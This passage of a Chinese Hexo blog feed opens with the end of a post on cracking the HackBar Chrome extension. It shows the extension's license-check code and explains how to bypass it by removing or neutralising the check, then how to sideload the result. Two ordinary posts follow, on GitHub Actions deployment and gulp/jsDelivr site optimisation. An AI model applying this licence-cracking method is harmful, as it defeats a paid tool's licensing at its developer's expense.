class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 授权验证失败</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">disable_hackbar</span>(<span class="params">message=null</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 将hidden属性移除，就会显示输入证书的红框</span></span><br><span class="line">    $(<span class="string">'#alert-license'</span>).removeClass(<span class="string">'hidden'</span>);</span><br><span class="line">    <span class="comment">// 如果有消息，就在证书那个红框显示出来</span></span><br><span class="line">    <span class="keyword">if</span>(message)&#123;</span><br><span class="line">        $(<span class="string">'#alert-license span'</span>).text(message);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 标记证书无效</span></span><br><span class="line">    license_ok = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从chrome本地存储中获取都license内容</span></span><br><span class="line">chrome.storage.local.get([<span class="string">'license'</span>], <span class="function"><span class="keyword">function</span> (<span class="params">result</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> license = result.license;</span><br><span class="line">    <span class="comment">// 如果证书内容存在</span></span><br><span class="line">    <span class="keyword">if</span> (license) &#123;</span><br><span class="line">        <span class="comment">//通过链接谷歌服务器检查网络情况</span></span><br><span class="line">        fetch(<span class="string">"https://google.com"</span>)</span><br><span class="line">            .then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">                <span class="comment">// 从证书服务器检查证书</span></span><br><span class="line">                fetch(license_server + <span class="string">"/"</span> + license)</span><br><span class="line">                    .then(<span class="function"><span class="keyword">function</span> (<span class="params">response</span>) </span>&#123;</span><br><span class="line">                        <span class="keyword">return</span> response.json();</span><br><span class="line">                    &#125;)</span><br><span class="line">                    .then(<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">                        <span class="comment">// 无效的证书会返回</span></span><br><span class="line">                        <span class="comment">// &#123;"pong":false,"message":"License is invalid"&#125;</span></span><br><span class="line">                        <span class="keyword">const</span> pong = data.pong;</span><br><span class="line">                        <span class="keyword">if</span> (pong === <span class="literal">false</span>) &#123;</span><br><span class="line">                            <span class="comment">// 证书无效，调用函数显示红框并使功能不可用</span></span><br><span class="line">                            disable_hackbar(data.message);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">                        <span class="comment">// 授权服务器连接不上</span></span><br><span class="line">                        disable_hackbar();</span><br><span class="line">                    &#125;);</span><br><span class="line">            &#125;)</span><br><span class="line">            .then(<span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">            &#125;).catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 证书不存在，直接禁用插件</span></span><br><span class="line">        disable_hackbar();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">........</span><br><span class="line"><span class="comment">// 证书检查函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_license</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">// 检查 license_ok 标记</span></span><br><span class="line">    <span class="keyword">if</span>(!license_ok)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Please input valid license!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="进行破解"><a href="#进行破解" class="headerlink" title="进行破解"></a>进行破解</h3><p>通过上面对授权验证代码的分析，我们可以找到很多破解的思路，核心有一下几点：</p><ul><li><code>license_ok</code> 一开始是 <code>true</code></li><li>证书检查失败的红框一开始是隐藏的</li><li>授权验证失败调用的是 <code>disable_hackbar()</code> 函数</li><li>只在一处地方会向 服务器 检查证书状况</li><li>其他地方都是通过 <code>check_license()</code> 也就是 <code>license_ok</code> 标记检查授权的</li></ul><p>也就是说，一共有两个关键点：</p><ol><li>证书检查失败的红框</li><li>功能的正常使用</li></ol><p>针对证书检查失败的红框，只需要 <code>disable_hackbar</code> 函数不运行 或者 里面去除<code>hidden</code>标记的代码不运行，就不会显示红框了</p><p>针对功能的正常使用，有很多办法可以达到：</p><ol><li>首先我们知道，这些功能都是在调用 <code>check_license()</code> 函数检查授权情况的，所以我们可以将这个函数里面检查的代码全都注释掉</li><li>我们还发现， <code>check_license()</code> 函数是通过 <code>license_ok</code> 标记检查授权的，所以我们可以在检查前将 <code>license_ok</code> 标记为 <code>true</code>，或者说将前面标记 <code>license_ok = false</code> 的代码注释掉</li></ol><p>最后我们发现，红框一开始是不显示的，<code>license_ok</code>一开始是<code>true</code>的，而前面所看到的授权验证的代码的唯一可能影响就是让红框显示、<code>license_ok</code>为<code>false</code>，所以那段代码直接删除了就ok了</p><blockquote><p>我不会直接给出破解后的代码和插件的，希望大家能够根据上面的分析和破解思路自己进行破解</p></blockquote><h2 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h2><p>近年来，通过浏览器插件对用户进行攻击、获取用户隐私信息的攻击越来越多，现代浏览器厂商为了保护用户的安全，往往会对发布的浏览器插件进行严格审查，对未经签名验证的插件不予安装或安装后无法运行</p><p>所以我们破解后的HackBar是无法通过正常途径安装的，我们需要通过开发者模式进行安装</p><p>在扩展程序页面右上角打开 开发者模式，这样就可以不经签名安装自己开发的插件</p><p>左上角 加载已解压的扩展程序 按钮，我们选择刚刚破解好的HackBar目录，就可以顺利将 HackBar 安装上了</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/hack-hackbar/chrome-import.jpg" loading="lazy" class="" title="[插件安装]"><p>通过这种方式安装的插件，每一次chrome重新启动都会有一个提示框，很烦人，但是能用</p><blockquote><p>当然，也可以通过注册开发者账号，将插件通过官方渠道审核、签名、发布<br>这样所有人都可以安装了，当然推荐是 <strong>不公开</strong> 的发布模式</p></blockquote><p>安装后，按F12，插件就可以正常使用了</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/hack-hackbar/hack-hackbar-done.jpg" loading="lazy" class="" title="[破解后]"><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文以HackBar的chrome插件的分析破解为例，想大家展示了浏览器插件的简单破解，Firefox的插件破解也是大同小异，希望大家可以活学活用</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;相信很多研究安全或者打CTF的朋友都在使用HackBar，在浏览器中使用HackBar构造并发送请求非常方便，特别是测试sql注入和xss等
      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="coding" scheme="https://blog.lgf.im/tags/coding/"/>
    
      <category term="HackBar" scheme="https://blog.lgf.im/tags/HackBar/"/>
    
      <category term="CTF" scheme="https://blog.lgf.im/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>使用Github Actions对Hexo博客自动部署</title>
    <link href="https://blog.lgf.im/2020/use-github-actions-to-auto-deploy-hexo.html"/>
    <id>https://blog.lgf.im/2020/use-github-actions-to-auto-deploy-hexo.html</id>
    <published>2020-03-21T01:24:56.000Z</published>
    <updated>2020-06-18T05:55:26.003Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>很多同学和我一样也在用Hexo搭建自己的博客，通常最后发布的操作是 <code>hexo g</code> 生成静态网页，然后 <code>hexo d</code> 将public目录推送到github、coding、gitee等平台。</p><p>但是很多时候我们都想偷个懒，只管写博客，写完后将git 一 push，后面的生成部署工作让程序自动完成，github actions为我们提供了这个便利。</p><h2 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h2><h3 id="开启actions功能"><a href="#开启actions功能" class="headerlink" title="开启actions功能"></a>开启actions功能</h3><p>在我们博客的github仓库顶部可以找到 Actions 菜单，在里面我们可以搜索、选择各种预备好的actions模板，也可以点击 <code>Set up a workflow yourself</code> 按钮创建自己的工作流。</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/use-github-actions-to-auto-deploy-hexo/github1.jpg" loading="lazy" class="" title="[github actions]"><p>这里我的部署工作稍微复杂点，所以选择自己编写工作流配置文件。</p><p>在手动编写面板的右侧可以搜索别人写好的各种actions，方便我们使用这些actions配置一些基本的工作</p><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201700555/2020/use-github-actions-to-auto-deploy-hexo/action-mark.jpg" loading="lazy" class="" title="[github actions marketplace]"><p>当然，也可以选择在 hexo 根目录下创建 <code>.github/workflows</code> 目录，并在里面编写github actions配置文件的方法来开启这个功能。</p><h3 id="基本部署"><a href="#基本部署" class="headerlink" title="基本部署"></a>基本部署</h3><p>首先我们需要将git库的代码检出到github actions提供的容器中，这里使用github提供的checkout步骤</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@master</span></span><br><span class="line">  <span class="attr">with:</span></span><br><span class="line">    <span class="attr">submodules:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>因为hexo需要依赖node.js环境，所以我们还要安装node环境</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@master</span></span><br><span class="line">  <span class="attr">with:</span></span><br><span class="line">    <span class="attr">node-version:</span> <span class="number">12.</span><span class="string">x</span></span><br></pre></td></tr></table></figure><p>有了node环境后我们需要安装各种依赖包</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Installation</span></span><br><span class="line">  <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">    <span class="string">npm</span> <span class="string">install</span></span><br><span class="line">    <span class="string">npm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">hexo-cli</span></span><br></pre></td></tr></table></figure><p>依赖装好后就可以执行命令生成静态网站了</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Generate</span></span><br><span class="line">  <span class="attr">run:</span> <span class="string">hexo</span> <span class="string">clean</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">g</span></span><br></pre></td></tr></table></figure><p>最后一步就是将生成的public目录推到github仓库的page分支上，这样github pages就会将最新的网站自动部署了</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span></span><br><span class="line">  <span class="attr">uses:</span> <span class="string">peaceiris/actions-gh-pages@v3</span></span><br><span class="line">  <span class="attr">with:</span></span><br><span class="line">    <span class="attr">github_token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">    <span class="attr">publish_dir:</span> <span class="string">./public</span></span><br><span class="line">    <span class="attr">cname:</span> <span class="string">g.blog.lgf.im</span></span><br></pre></td></tr></table></figure><h3 id="增加更多功能"><a href="#增加更多功能" class="headerlink" title="增加更多功能"></a>增加更多功能</h3><p>在github actions工作流中，还可以完成更多更复杂的操作，里面可以直接执行shell脚本，可以使用docker镜像提供的特殊环境，大家可以根据自己需求进行修改。</p><h2 id="完整配置文件"><a href="#完整配置文件" class="headerlink" title="完整配置文件"></a>完整配置文件</h2><p>我的配置文件是适合我自己博客用的，里面还包括了网页、js、css、图片的压缩，cdn链接的替换，自动打release方便绕过jsDelivr的缓存。</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Hexo</span> <span class="string">CICD</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">hexo</span> <span class="string">build</span> <span class="string">&amp;</span> <span class="string">deploy</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-18.04</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@master</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">submodules:</span> <span class="literal">true</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@master</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">node-version:</span> <span class="number">12.</span><span class="string">x</span>  </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">replace</span> <span class="string">cdn</span> <span class="string">url</span></span><br><span class="line">      <span class="attr">id:</span> <span class="string">replace</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">tagname=$(date</span> <span class="string">+%y%j%H%M)</span></span><br><span class="line">        <span class="string">sed</span> <span class="string">-i</span> <span class="string">"s/hexoblog/hexoblog@$tagname/g"</span> <span class="string">_config.yml</span></span><br><span class="line">        <span class="string">sed</span> <span class="string">-i</span> <span class="string">"s/hexoblog/hexoblog@$tagname/g"</span> <span class="string">themes/cactus/_config.yml</span></span><br><span class="line">        <span class="string">echo</span> <span class="string">"::set-output name=tagname::$tagname"</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Installation</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">        <span class="string">npm</span> <span class="string">install</span></span><br><span class="line">        <span class="string">npm</span> <span class="string">install</span> <span class="string">-g</span> <span class="string">hexo-cli</span> <span class="string">gulp</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Generate</span></span><br><span class="line">      <span class="attr">run:</span> <span class="string">hexo</span> <span class="string">clean</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">g</span> <span class="string">&amp;&amp;</span> <span class="string">gulp</span> <span class="string">&amp;&amp;</span> <span class="string">hexo</span> <span class="string">d</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Deploy</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">peaceiris/actions-gh-pages@v3</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">github_token:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">publish_dir:</span> <span class="string">./public</span></span><br><span class="line">        <span class="attr">cname:</span> <span class="string">g.blog.lgf.im</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Create</span> <span class="string">Release</span></span><br><span class="line">      <span class="attr">uses:</span> <span class="string">actions/create-release@latest</span></span><br><span class="line">      <span class="attr">env:</span></span><br><span class="line">        <span class="attr">GITHUB_TOKEN:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.GITHUB_TOKEN</span> <span class="string">&#125;&#125;</span></span><br><span class="line">      <span class="attr">with:</span></span><br><span class="line">        <span class="attr">tag_name:</span> <span class="string">$&#123;&#123;</span> <span class="string">steps.replace.outputs.tagname</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">release_name:</span> <span class="string">$&#123;&#123;</span> <span class="string">steps.replace.outputs.tagname</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">body:</span> <span class="string">Automatic</span> <span class="string">generated</span></span><br><span class="line">        <span class="attr">draft:</span> <span class="literal">false</span></span><br><span class="line">        <span class="attr">prerelease:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><blockquote><p>在github actions将page专用分支更新后，zeit\netlify\github pages三个平台都会自动将最新的内容部署上，这样我就只需要关注博客内容，后续操作都不需要管了</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;很多同学和我一样也在用Hexo搭建自己的博客，通常最后发布的操作是 &lt;code&gt;hexo g&lt;/code&gt; 生成静态网页，然后 &lt;code&gt;
      
    
    </summary>
    
    
      <category term="coding" scheme="https://blog.lgf.im/categories/coding/"/>
    
    
      <category term="coding" scheme="https://blog.lgf.im/tags/coding/"/>
    
      <category term="Github" scheme="https://blog.lgf.im/tags/Github/"/>
    
      <category term="CICD" scheme="https://blog.lgf.im/tags/CICD/"/>
    
      <category term="hexo" scheme="https://blog.lgf.im/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>加快Github Pages国内访问速度</title>
    <link href="https://blog.lgf.im/2020/speedup-github-page.html"/>
    <id>https://blog.lgf.im/2020/speedup-github-page.html</id>
    <published>2020-03-19T09:17:53.000Z</published>
    <updated>2020-06-18T05:55:26.003Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>相信不少小伙伴都在使用Github Pages提供的免费静态网站托管来搭建自己的博客，但是因为墙的存在和特殊国情，使用Github Pages搭建的网站速度普遍不快，因此很多小伙伴只能转战国内付费的服务器和CDN。</p><p>正巧我也在使用Github Pages搭建自己的静态博客，正好来说一下我的优化方法。</p><h2 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h2><p>默认情况下，如果我们查看Hexo生成的静态网页源代码，会发现存在大量的空格、空行、注释等无用内容。同样的，如果使用的hexo主题没有进行优化，大量的css和js文件也存在这样的垃圾内容。</p><p>如果你在一些大型网站右键查看网页源代码，你会发现他们的html\js\css是经过压缩处理的，没有多余的换行和注释，这势必会节省带宽流量和传输时间，提升用户体验。</p><p>所以我们优化速度的第一关就是对Hexo生成的代码进行压缩。</p><p>这里我使用的工具是 gulp</p><h3 id="安装gulp"><a href="#安装gulp" class="headerlink" title="安装gulp"></a>安装gulp</h3><p>在自己本机安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp -g</span><br></pre></td></tr></table></figure><p>为了Github Action或其他CI\CD平台也能够进行安装，这里推荐</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp --save-dev</span><br></pre></td></tr></table></figure><p>我们还需要一些依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">npm install --save-dev \</span><br><span class="line">            gulp-minify-css \</span><br><span class="line">            gulp-babel \</span><br><span class="line">            gulp-uglify \</span><br><span class="line">            gulp-htmlmin \</span><br><span class="line">            gulp-htmlclean \</span><br><span class="line">            gulp-imagemin \</span><br><span class="line">            imagemin-jpegtran \</span><br><span class="line">            imagemin-svgo \</span><br><span class="line">            imagemin-gifsicle \</span><br><span class="line">            imagemin-optipng</span><br></pre></td></tr></table></figure><h3 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件"></a>创建配置文件</h3><p>在博客hexo的根目录下，新建 <code>gulpfile.js</code> 配置文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">'gulp'</span>);</span><br><span class="line"><span class="keyword">var</span> minifycss = <span class="built_in">require</span>(<span class="string">'gulp-minify-css'</span>);</span><br><span class="line"><span class="keyword">var</span> uglify = <span class="built_in">require</span>(<span class="string">'gulp-uglify'</span>);</span><br><span class="line"><span class="keyword">var</span> htmlmin = <span class="built_in">require</span>(<span class="string">'gulp-htmlmin'</span>);</span><br><span class="line"><span class="keyword">var</span> htmlclean = <span class="built_in">require</span>(<span class="string">'gulp-htmlclean'</span>);</span><br><span class="line"><span class="keyword">var</span> imagemin = <span class="built_in">require</span>(<span class="string">'gulp-imagemin'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩css文件</span></span><br><span class="line">gulp.task(<span class="string">'minify-css'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.src(<span class="string">'./public/**/*.css'</span>)</span><br><span class="line">  .pipe(minifycss())</span><br><span class="line">  .pipe(gulp.dest(<span class="string">'./public'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩html</span></span><br><span class="line">gulp.task(<span class="string">'minify-html'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.src(<span class="string">'./public/**/*.html'</span>)</span><br><span class="line">      .pipe(htmlclean())</span><br><span class="line">      .pipe(htmlmin(&#123;</span><br><span class="line">          collapseWhitespace: <span class="literal">true</span>,</span><br><span class="line">          collapseBooleanAttributes: <span class="literal">true</span>,</span><br><span class="line">          removeComments: <span class="literal">true</span>,</span><br><span class="line">          removeEmptyAttributes: <span class="literal">true</span>,</span><br><span class="line">          removeScriptTypeAttributes: <span class="literal">true</span>,</span><br><span class="line">          removeStyleLinkTypeAttributes: <span class="literal">true</span>,</span><br><span class="line">          minifyJS: <span class="literal">true</span>,</span><br><span class="line">          minifyCSS: <span class="literal">true</span>,</span><br><span class="line">          minifyURLs: <span class="literal">true</span>,</span><br><span class="line">          ignoreCustomFragments: [ <span class="regexp">/\&#123;\&#123;[\s\S]*?\&#125;\&#125;/</span> ],</span><br><span class="line">      &#125;))</span><br><span class="line">      .pipe(gulp.dest(<span class="string">'./public'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩js文件</span></span><br><span class="line">gulp.task(<span class="string">'minify-js'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src([<span class="string">'./public/**/*.js'</span>,<span class="string">'!./public/js/**/*min.js'</span>])</span><br><span class="line">        .pipe(uglify())</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'./public'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 压缩图片</span></span><br><span class="line">gulp.task(<span class="string">'minify-images'</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gulp.src([<span class="string">'./public/**/*.png'</span>, <span class="string">'./public/**/*.jpg'</span>, <span class="string">'./public/**/*.gif'</span>, <span class="string">'./public/**/*.svg'</span>])</span><br><span class="line">        .pipe(imagemin([</span><br><span class="line">                imagemin.gifsicle(&#123;<span class="attr">interlaced</span>: <span class="literal">true</span>&#125;),</span><br><span class="line">                imagemin.mozjpeg(&#123;<span class="attr">quality</span>: <span class="number">75</span>, <span class="attr">progressive</span>: <span class="literal">true</span>&#125;),</span><br><span class="line">                imagemin.optipng(&#123;<span class="attr">optimizationLevel</span>: <span class="number">5</span>&#125;),</span><br><span class="line">                imagemin.svgo(&#123;</span><br><span class="line">                          plugins: [</span><br><span class="line">                              &#123;<span class="attr">removeViewBox</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">                              &#123;<span class="attr">cleanupIDs</span>: <span class="literal">false</span>&#125;</span><br><span class="line">                          ]</span><br><span class="line">                &#125;)</span><br><span class="line">        ]))</span><br><span class="line">        .pipe(gulp.dest(<span class="string">'./public'</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gulp.task(<span class="string">'default'</span>, gulp.series(gulp.parallel(<span class="string">'minify-html'</span>, <span class="string">'minify-css'</span>, <span class="string">'minify-js'</span>, <span class="string">'minify-images'</span>)));</span><br></pre></td></tr></table></figure><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>在使用 <code>hexo g</code> 生成静态网站后， 运行 <code>gulp</code> 进行压缩</p><h2 id="使用-CDN"><a href="#使用-CDN" class="headerlink" title="使用 CDN"></a>使用 CDN</h2><p>如果你查看博客的网络请求内容，你会发现在html加载之后，还有一堆小文件等待加载，而这些css\js\图片文件的加载占据了大部分的网页打开时间。</p><p>因为Github Pages的延迟巨大，速度极慢，我们更有必要使用国内的CDN对这些资源进行分发。</p><p>不想使用国内付费的CDN服务，我尝试过使用CloudFlare进行加速（实质减速）效果不佳，后来发现了jsDelivr。</p><p>jsDelivr 是一家开源免费CDN，主要是对npm包进行CDN分发</p><p>绝妙的是它还能对Github和Wordpress进行CDN分发</p><p>我们可以借助 jsDelivr 的 Github资源分发 服务来对我们博客中的css\js\小图片进行加速</p><blockquote><p>这是我目前找到的唯一一家在国内有节点并且不需要备案的CDN分发服务  </p></blockquote><p>这里我就以我使用的主题为例，分享一下我如何使用jsDelivr进行CDN分发</p><h3 id="链接格式"><a href="#链接格式" class="headerlink" title="链接格式"></a>链接格式</h3><p>jsDelivr 针对 Github 资源有众多URL格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;user&#x2F;repo@version&#x2F;file</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2.1&#x2F;dist&#x2F;jquery.min.js</span><br><span class="line">https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;jquery&#x2F;jquery@3.2&#x2F;dist&#x2F;jquery.min.js</span><br><span 